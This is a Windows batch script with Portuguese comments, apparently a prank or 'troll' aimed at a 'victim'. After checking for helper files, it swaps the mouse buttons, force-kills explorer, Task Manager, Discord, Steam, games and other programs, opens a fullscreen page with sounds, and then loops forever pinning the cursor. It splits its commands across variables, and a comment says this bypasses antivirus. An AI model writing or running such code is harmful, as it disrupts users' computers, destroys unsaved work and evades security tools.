
 @echo off

  goto buildverify_1


:buildverify_1

if not exist "scripts\resources\task\msgbox\build.bat" (

      rem mensagem de erro;
      
       msg * build.bat nao encontrado, portanto nao podera prosseguir.

       rem fechando;
        exit

) else (
    
       rem indo para...
        goto buildverify_2
        
)


:buildverify_2

if not exist "scripts\resources\task\msgbox\null.vbs" (

      rem mensagem de erro;

       msg * null.vbs nao encontrado, portanto nao podera prosseguir.

       rem fechando;
        exit

) else (
        
         rem indo para...

        goto fullscreenverify
        
)


:fullscreenverify

if not exist "scripts\resources\task\index\full\keys.vbs" (

   
        rem iniciando o build.bat;
       start scripts\resources\task\msgbox\build.bat
 
        rem aguardando o build.bat iniciar;
          timeout -t 2 >nul

        rem deletando a msgbox;
             del /q erro.vbs

        rem fechando;
        exit

) else (
   
         rem indo para..
         
        goto verify_1

)


:verify_1

if not exist "scripts\resources\task\index\index.html" (

   
        rem iniciando o build.bat;
       start scripts\resources\task\msgbox\build.bat
 
        rem aguardando o build.bat iniciar;
          timeout -t 2 >nul

        rem deletando a msgbox;
             del /q erro.vbs

        rem fechando;
        exit

) else (
   
         rem indo para..
         
        goto verify_2

)

 
:verify_2

if not exist "scripts\resources\task\index\fundo\bg.gif" (

   
        rem iniciando o build.bat;
       start scripts\resources\task\msgbox\build.bat
 
        rem aguardando o build.bat iniciar;
          timeout -t 2 >nul

        rem deletando a msgbox;
             del /q erro.vbs

        rem fechando;
        exit

) else (
   
         rem indo para..
         
        goto verify_3

)

 
:verify_3

if not exist "scripts\resources\task\index\som\som_1.mp3" (

   
        rem iniciando o build.bat;
       start scripts\resources\task\msgbox\build.bat
 
        rem aguardando o build.bat iniciar;
          timeout -t 2 >nul

        rem deletando a msgbox;
             del /q erro.vbs

        rem fechando;
        exit

) else (
   
         rem indo para..
         
        goto verify_4

)

:verify_4


if not exist "scripts\resources\task\index\som\som_2.mp3" (

   
        rem iniciando o build.bat;
       start scripts\resources\task\msgbox\build.bat
 
        rem aguardando o build.bat iniciar;
          timeout -t 2 >nul

        rem deletando a msgbox;
             del /q erro.vbs

        rem fechando;
        exit

) else (
   
         rem indo para..

        goto completado

)


:completado

   rem abaixo: setando variaveis

  set gb1=taskk

 set gb2=ill /f /im

  set d1=Run

 set d2=dll32

  set d3=Use

 set d4=r32

  set d5=Swa

 set d6=pMou

  set d7=seBu

 set d8=tton

    rem trocando botões do mouse

   %d1%%d2% %d3%%d4% , %d5%%d6%%d7%%d8%

 set ci=lorer

  set ht=cord

 set hy=sApp

  set ef=aw

 set kj=tLauncher

  set tl=pEng

 set lp=e

  set jj=o.UI

 set co=aint

  set hu=PlayerBeta

 set re=fi_windows

 set uy=eam

  set s4=epad

 set c1=kmgr

  set a3=tify

   rem fechando processos

  %gb1%%gb2% dis%ht%.exe


 %gb1%%gb2% exp%ci%.exe


  %gb1%%gb2% jav%ef%.exe


 %gb1%%gb2% Ms%tl%.exe


  %gb1%%gb2% mspM%co%.exe


 %gb1%%gb2% Minecraf%kj%.exe


  %gb1%%gb2% Roblox%hu%.exe


 %gb1%%gb2% What%hy%.exe


  %gb1%%gb2% Vide%jj%.exe


 %gb1%%gb2% Cod%lp%.exe


  %gb1%%gb2% wi%re%.exe


 %gb1%%gb2% St%uy%.exe


   %gb1%%gb2% not%s4%.exe


  %gb1%%gb2% Tas%c1%.exe

    %gb1%%gb2% Spo%a3%.exe
   
   goto b

:b

rem iniciando o index;
   start scripts\resources\task\index\index.html

        rem já temos um timer no keys.vbs então não precisa colocar aqui;

       rem iniciando o fullscreen;
        start scripts\resources\task\index\full\keys.vbs

            rem recado; 
             echo sorry pela troll s2 - kayo >>recadinho.txt

             goto c


:c
  rem agora.. vamos brincar um pouco com o cursor da vitima (tem bypass pra não pegar em antvirus)
 

set a=RunDl
set b=l32
set c=user32.
set d=SetCur
set e=sorPos 

%a%%b%.exe %c%dll,%d%%e% 100, 100
 
goto c

rem fim :3